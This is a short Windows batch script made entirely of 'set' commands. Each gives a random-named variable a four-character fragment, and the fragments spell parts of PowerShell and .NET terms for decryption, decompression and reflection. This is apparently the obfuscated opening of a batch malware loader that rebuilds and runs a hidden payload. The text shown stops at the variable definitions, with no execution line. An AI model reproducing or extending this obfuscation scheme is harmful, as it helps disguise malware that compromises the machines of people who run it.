@echo off
set "JHLQnxXPZI=pres"
set "NOTGUqhzdb=, (,"
set "xpuJBuHFel=hy.A"
set "fekzioZyWi=UGTu"
set "LSHuckXcGK=Mode"
set "SNUjvyalDM=flec"
set "UdGlxLcTMC= if "
set "SuFMqdUehR=).Sp"
set "QsnunLjGwT=qYNA"
set "LseIJGGrsx=ress"
set "rhWdXGIUAN=lit("
set "nYJgoQnXRP=ach "
set "DsYUeIWLbe=$Rdj"
set "kWdqAiTnHF=am;$"
set "XUxEkCBvzL=lVt."
set "EeAxmaRNsl===')"
set "nnVqSvePcd=y]::"
set "CEqQCHgKzc=();$"
set "FUjXfDsKix=rans"
set "xZHQdURiuA=yTo("
set "QxKWFrkVXD=PKCS"
set "EfHhYcfzWl=('l0"
set "bRPNkINZgC=KkbF"
set "XFxFkBHsAF=Star"
set "WARkAqGfpL=1] -"
set "ERjofGqQAD=ptog"
set "uzluRbragT=Fo7l"
set "eJfwSBSUlq= [st"
set "fuzbPGxdek=();$"
set "RhUQNWgCTU=-Obj"
set "vobJMXKwnE=qYNA"
set "KWwebvudnd=tion"
set "ReMktpuwao=ZYYc"
set "wCmtJoArbh=Bmor"
set "lXlRnEsHTb=bjec"
set "bdqcPSHpub=1..-"
set "AwAJoZFsnZ=join"
set "PFcEEBOsOW=ateD"
